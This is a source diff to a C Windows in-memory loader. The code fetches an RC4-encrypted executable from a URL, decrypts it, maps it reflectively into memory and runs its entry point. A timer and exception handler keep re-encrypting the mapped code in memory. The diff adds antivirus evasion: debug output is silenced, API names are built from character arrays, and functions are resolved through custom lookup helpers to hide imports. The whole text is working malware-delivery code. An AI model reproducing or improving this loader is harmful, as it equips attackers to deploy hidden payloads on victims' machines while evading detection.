@@ -2,42 +2,11 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <wininet.h>
+#include "helpers.h"
 
 #pragma comment(lib, "wininet")
 
 #define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %d\n", cApiName, GetLastError())
-
-typedef struct _PE_HEADERS
-{
-	PBYTE                    pFileBuffer;
-	DWORD                    dwFileSize;
-
-	PIMAGE_NT_HEADERS        pImgNtHdrs;
-	PIMAGE_SECTION_HEADER    pImgSecHdr;
-
-	PIMAGE_DATA_DIRECTORY    pEntryImportDataDir;
-	PIMAGE_DATA_DIRECTORY    pEntryBaseRelocDataDir;
-	PIMAGE_DATA_DIRECTORY    pEntryTLSDataDir;
-	PIMAGE_DATA_DIRECTORY    pEntryExceptionDataDir;
-	PIMAGE_DATA_DIRECTORY    pEntryExportDataDir;
-
-	BOOL                     bIsDLLFile;
-} PE_HEADERS, *PPE_HEADERS;
-
-typedef struct _BASE_RELOCATION_ENTRY {
-	WORD Offset : 12;
-	WORD Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
-
-typedef BOOL(WINAPI* MAIN)();
-
-typedef struct _USTRING {
-	DWORD Length;
-	DWORD MaximumLength;
-	unsigned char* Buffer;
-} USTRING, *PUSTRING;
-
-typedef NTSTATUS(WINAPI* pSystemFunction032)(PUSTRING uStrBuffer, PUSTRING uStrKey);
 
 HANDLE g_hTimerQueue = INVALID_HANDLE_VALUE;
 HANDLE g_hTimer = INVALID_HANDLE_VALUE;
@@ -50,13 +19,18 @@ SIZE_T g_sPeRXSize = 0;
 
 BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
 {
-	printf("[+] Performing initial decryption\n");
+	//printf("[+] Performing initial decryption\n");
 	NTSTATUS STATUS = 0;
 	BYTE Rc4Key[RC4_KEY_SIZE] = { 0x47,0xa4,0xff,0xb2,0x89,0x67,0x30,0xe5,0x54,0xb0,0x28,0xbf,0x65,0xab,0xea,0x58 };
+
 	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
 	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };
 
-	pSystemFunction032 SystemFunction032 = (pSystemFunction032)GetProcAddress(LoadLibrary(TEXT("Advapi32")), "SystemFunction032");
+	char sSystemFunction032[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };
+
+	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+
+	pSystemFunction032 SystemFunction032 = (pSystemFunction032)hlpGetProcAddress(pLoadLibraryW(L"Advapi32.dll"), sSystemFunction032);
 
 	DWORD dwOldProtection = 0x00;
 
@@ -65,7 +39,7 @@ BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
 
 	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
 	{
-		PRINT_WINAPI_ERR("SystemFunction032");
+		PRINT_WINAPI_ERR(sSystemFunction032);
 		return FALSE;
 	}
 
@@ -77,7 +51,7 @@ BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
 
 BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize)
 {
-	printf("[+] Downloading payload\n");
+	//printf("[+] Downloading payload\n");
 	LPCSTR cUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
 	HINTERNET hInternet = NULL;
 	HINTERNET hInternetFile = NULL;
@@ -96,7 +70,7 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 		goto _FUNC_CLEANUP;
 	}
 
-	if (!(hInternetFile = InternetOpenUrlA(hInternet, sURL, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_HYPERLINK, 0)))
+	if (!(hInternetFile = InternetOpenUrlA(hInternet, sURL, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_NO_CACHE_WRITE, 0)))
 	{
 		PRINT_WINAPI_ERR("InternetOpenUrlA");
 		isSuccess = FALSE;
@@ -174,7 +148,7 @@ _FUNC_CLEANUP:
 
 BOOL InitializePeStruct(OUT PPE_HEADERS pPeHeaders, IN PBYTE pFileBuffer, IN DWORD dwFileSize)
 {
-	printf("[+] Initializing PE Headers\n");
+	//printf("[+] Initializing PE Headers\n");
 	if (!pPeHeaders || !pFileBuffer || !dwFileSize)
 		return FALSE;
 
@@ -199,7 +173,7 @@ BOOL InitializePeStruct(OUT PPE_HEADERS pPeHeaders, IN PBYTE pFileBuffer, IN DWO
 
 BOOL FixRelocations(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress)
 {
-	printf("\t> Mapping relocations\n");
+	//printf("\t> Mapping relocations\n");
 	PIMAGE_BASE_RELOCATION pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);
 
 
@@ -248,7 +222,7 @@ BOOL FixRelocations(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PT
 
 BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress)
 {
-	printf("\t> Mapping IAT\n");
+	//printf("\t> Mapping IAT\n");
 	PIMAGE_IMPORT_DESCRIPTOR pImgDescriptor = NULL;
 
 	for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
@@ -264,8 +238,9 @@ BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYT
 		ULONG_PTR uFirstThunkRVA		 = pImgDescriptor->FirstThunk;
 		SIZE_T ImgThunkSize				 = 0;
 		HMODULE hModule					 = NULL;
+		tLoadLibraryA pLoadLibraryA = (tLoadLibraryA)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
 
-		if (!(hModule = LoadLibraryA(cDllName)))
+		if (!(hModule = pLoadLibraryA(cDllName)))
 		{
 			PRINT_WINAPI_ERR("LoadLibraryA");
 			return FALSE;
@@ -293,7 +268,7 @@ BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYT
 			else
 			{
 				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
-				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name)))
+				if (!(pFuncAddress = (ULONG_PTR)hlpGetProcAddress(hModule, pImgImportByName->Name)))
 				{
 					printf("Could not import !%s.%s\n", cDllName, pImgImportByName->Name);
 					return FALSE;
@@ -311,7 +286,10 @@ BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYT
 
 BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHeaders, IN PIMAGE_SECTION_HEADER pImgSecHeader)
 {
-	printf("\t> Setting memory permissions\n");
+	//printf("\t> Setting memory permissions\n");
+	char sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
+	tVirtualProtect pVirtualProtect = (tVirtualProtect)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), sVirtualProtect);
+
 	for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++)
 	{
 		DWORD dwProtection = 0;
@@ -358,9 +336,9 @@ BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtH
 			dwProtection = PAGE_EXECUTE_READWRITE;
 
 
-		if (!VirtualProtect((PVOID)(pPeBaseAddress + pImgSecHeader[i].VirtualAddress), pImgSecHeader[i].SizeOfRawData, dwProtection, &dwOldProtection))
+		if (!pVirtualProtect((PVOID)(pPeBaseAddress + pImgSecHeader[i].VirtualAddress), pImgSecHeader[i].SizeOfRawData, dwProtection, &dwOldProtection))
 		{
-			PRINT_WINAPI_ERR("VirtualProtect");
+			PRINT_WINAPI_ERR(sVirtualProtect);
 			return FALSE;
 		}
 	}
@@ -372,11 +350,18 @@ BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtH
 BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL bDecrypt)
 {
 	NTSTATUS STATUS = 0;
-	BYTE Rc4Key[RC4_KEY_SIZE] = { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
+	BYTE Rc4Key[RC4_KEY_SIZE] = { 0x71,0x84,0x03,0x68,0x6a,0xe6,0xcf,0x8d,0x4a,0x8a,0xff,0x03,0x25,0x23,0x7d,0x75 };
 	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
 	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };
 
-	pSystemFunction032 SystemFunction032 = (pSystemFunction032)GetProcAddress(LoadLibrary(TEXT("Advapi32")), "SystemFunction032");
+	HMODULE kern32 = hlpGetModuleHandle(L"kernel32.dll");
+
+	char sSystemFunction032[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };
+	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(kern32, "LoadLibraryW");
+	pSystemFunction032 SystemFunction032 = (pSystemFunction032)hlpGetProcAddress(pLoadLibraryW(L"Advapi32.dll"), sSystemFunction032);
+
+	char sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
+	tVirtualProtect pVirtualProtect = (tVirtualProtect)hlpGetProcAddress(kern32, sVirtualProtect);
 
 	DWORD dwOldProtection = 0x00;
 
@@ -384,22 +369,22 @@ BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL bDecrypt)
 		return FALSE;
 
 	// change permissions to RW to enc / dec
-	if (!VirtualProtect(pBuffer, dwBufferLen, PAGE_READWRITE, &dwOldProtection))
+	if (!pVirtualProtect(pBuffer, dwBufferLen, PAGE_READWRITE, &dwOldProtection))
 	{
-		PRINT_WINAPI_ERR("VirtualProtect [1]");
+		PRINT_WINAPI_ERR(sVirtualProtect);
 		return FALSE;
 	}
 
 	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
 	{
-		PRINT_WINAPI_ERR("SystemFunction032");
+		PRINT_WINAPI_ERR(sSystemFunction032);
 		return FALSE;
 	}
 
 	// set mem permission back to RO/RX
-	if (!VirtualProtect(pBuffer, dwBufferLen, (bDecrypt == TRUE ? PAGE_EXECUTE_READ : PAGE_READONLY), &dwOldProtection))
+	if (!pVirtualProtect(pBuffer, dwBufferLen, (bDecrypt == TRUE ? PAGE_EXECUTE_READ : PAGE_READONLY), &dwOldProtection))
 	{
-		PRINT_WINAPI_ERR("VirtualProtect [2]");
+		PRINT_WINAPI_ERR(sVirtualProtect);
 		return FALSE;
 	}
 
@@ -433,9 +418,11 @@ LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
 
 
 			// execute the obfuscationtimercallback func after EXEC_WAIT seconds
-			if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
+			char sCreateTimerQueueTimer[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r', 'Q', 'u', 'e', 'u', 'e', 'T', 'i', 'm', 'e', 'r', '\0' };
+			tCreateTimerQueueTimer pCreateTimerQueueTimer = (tCreateTimerQueueTimer)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), sCreateTimerQueueTimer);
+			if (!pCreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
 			{
-				PRINT_WINAPI_ERR("CreateTimerQueueTimer");
+				PRINT_WINAPI_ERR(sCreateTimerQueueTimer);
 				goto _FAILURE;
 			}
 
@@ -452,7 +439,7 @@ _FAILURE:
 
 BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 {
-	printf("[+] Loading PE into memory\n");
+	//printf("[+] Loading PE into memory\n");
 
 	if (!pPeHeaders)
 		return FALSE;
@@ -460,10 +447,16 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 	PBYTE pPeBaseAddress = NULL;
 	PVOID pEntryPoint = NULL;
 	PVOID pVeHandler = NULL;
+	
+	HMODULE kern32 = hlpGetModuleHandle(L"kernel32.dll");
 
-	if ((pPeBaseAddress = VirtualAlloc(NULL, pPeHeaders->pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
+	char sVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
+
+	tVirtualAlloc pVirtualAlloc = (tVirtualAlloc)hlpGetProcAddress(kern32, sVirtualAlloc);
+
+	if ((pPeBaseAddress = pVirtualAlloc(NULL, pPeHeaders->pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
 	{
-		PRINT_WINAPI_ERR("VirtualAlloc");
+		PRINT_WINAPI_ERR(sVirtualAlloc);
 		return FALSE;
 	}
 
@@ -492,16 +485,19 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 	if (pPeHeaders->pEntryExceptionDataDir->Size)
 	{
 		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddress + pPeHeaders->pEntryExceptionDataDir->VirtualAddress);
-		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pPeHeaders->pEntryExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), (DWORD64)pPeBaseAddress))
+		tRtlAddFunctionTable pRtlAddFunctionTable = (tRtlAddFunctionTable)hlpGetProcAddress(kern32, "RtlAddFunctionTable");
+
+		if (!pRtlAddFunctionTable(pImgRuntimeFuncEntry, (pPeHeaders->pEntryExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), (DWORD64)pPeBaseAddress))
 		{
 			PRINT_WINAPI_ERR("RtlAddFunctionTable");
 			return FALSE;
 		}
 	}
 
-	printf("[*] Registering Vectored Exception Handler\n");
+	//printf("[*] Registering Vectored Exception Handler\n");
 	// Register a VEH
-	if (!(pVeHandler = AddVectoredExceptionHandler(0x01, VectoredExceptionHandler)))
+	tAddVectoredExceptionHandler pAddVectoredExceptionHandler = (tAddVectoredExceptionHandler)hlpGetProcAddress(kern32, "AddVectoredExceptionHandler");
+	if (!(pVeHandler = pAddVectoredExceptionHandler(0x01, VectoredExceptionHandler)))
 	{
 		PRINT_WINAPI_ERR("AddVectoredExceptionHandler");
 		return FALSE;
@@ -521,18 +517,20 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 	
 	pEntryPoint = (PVOID)(pPeBaseAddress + pPeHeaders->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
 
-	printf("[*] Queuing encryption fluctuation timer\n");
-	printf("\t>Exec Mem 0x%p | Size [ %ld ]\n", (PVOID)g_uPeRXAddress, (ULONG)g_sPeRXSize);
+	//printf("[*] Queuing encryption fluctuation timer\n");
+	//printf("\t> Exec Mem 0x%p | Size [ %ld ]\n", (PVOID)g_uPeRXAddress, (ULONG)g_sPeRXSize);
 	if (g_hTimerQueue == INVALID_HANDLE_VALUE)
 		g_hTimerQueue = CreateTimerQueue();
 
-	if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
+	char sCreateTimerQueueTimer[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r', 'Q', 'u', 'e', 'u', 'e', 'T', 'i', 'm', 'e', 'r', '\0' };
+	tCreateTimerQueueTimer pCreateTimerQueueTimer = (tCreateTimerQueueTimer)hlpGetProcAddress(kern32, sCreateTimerQueueTimer);
+	if (!pCreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
 	{
-		PRINT_WINAPI_ERR("CreateTimerQueueTimer");
+		PRINT_WINAPI_ERR(sCreateTimerQueueTimer);
 		return FALSE;
 	}
 
-	printf("[+] Executing PE Entrypoint\n");
+	//printf("[+] Executing PE Entrypoint\n");
 	MAIN pMain = (MAIN)pEntryPoint;
 	// ( *( VOID(*)() ) pEntryPoint )(); 
 	return pMain();
